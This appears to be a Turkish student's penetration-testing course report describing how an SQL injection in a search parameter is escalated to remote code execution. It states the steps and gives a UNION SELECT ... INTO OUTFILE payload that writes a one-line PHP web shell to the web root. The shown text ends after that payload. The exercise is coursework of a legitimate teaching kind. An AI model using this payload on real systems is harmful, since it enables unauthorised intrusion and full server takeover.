# Sızma Testi Projesi: SQL Injection to RCE Pipeline

**Öğrenci Adı:** Meltem Eser  
**Ders:** Sızma Testi  
**Seçilen Senaryo:** #L1 - SQLi to RCE Pipeline (Zorluk: 10/10)

---

## GİRİŞ VE HEDEF
Bu çalışmada, hedef web uygulamasındaki bir SQL Injection zafiyeti kullanılarak sunucu üzerinde bir arka kapı (Web Shell) oluşturulmuş ve bu sayede veritabanı zafiyeti, işletim sisteminde doğrudan komut çalıştırabilme (Remote Code Execution - RCE) noktasına evrilmiştir.

---

## ADIM 1: SQL Injection ve UNION Tabanlı Dosya Yazma Yetkisinin Tespiti
Hedef sitenin arama butonunda SQL Injection açığı tespit edilmiştir. Veritabanı kullanıcısının sunucuya dosya yazma yetkisi (FILE privilege) olduğu anlaşılmış ve UNION tabanlı sorgu ile sunucunun web dizinine zararlı bir PHP dosyası yüklenmiştir.

**Kullanılan SQL Enjeksiyonu ve Payload:**
```sql
[https://hedef-site.com/ara.php?id=-1](https://hedef-site.com/ara.php?id=-1)' UNION SELECT 1, "<?php system($_GET['cmd']); ?>", 3 INTO OUTFILE '/var/www/html/kabuk.php'-- -
